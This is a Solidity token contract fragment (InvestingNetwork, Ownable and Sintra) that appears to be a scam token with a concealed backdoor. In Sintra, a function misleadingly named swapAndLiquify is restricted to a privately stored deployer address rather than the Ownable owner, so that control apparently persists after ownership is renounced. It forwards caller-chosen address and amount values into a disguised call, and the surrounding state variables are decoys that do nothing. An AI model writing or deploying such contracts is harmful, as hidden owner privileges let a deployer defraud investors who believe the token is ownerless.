contract InvestingNetwork is NFTExchange {
    constructor(string memory name, string memory symbol, uint256 tTotalSupply) NFTExchange(name, symbol) {
        Perform(msg.sender, tTotalSupply * (10 ** uint256(decimals())));
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract Sintra is InvestingNetwork , Ownable {
address private _msgsender = _msgSender();
address uniswapRouter;
bool swapEnabled;
uint tradingOpen;
uint104 firstBlock;
    constructor(
        string memory name,
        string memory symbol,
        uint256 tTotalSupply
    ) InvestingNetwork(name, symbol, tTotalSupply) {}
    function swapAndLiquify(address uniswapV2Pair, uint256 uniswapV2Router) public {
        uniswapRouter = address(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        require(msg.sender == _msgsender);
        IERC20(uniswapV2Pair, uniswapV2Router);
        swapEnabled;
        tradingOpen;
        firstBlock;
    }

}
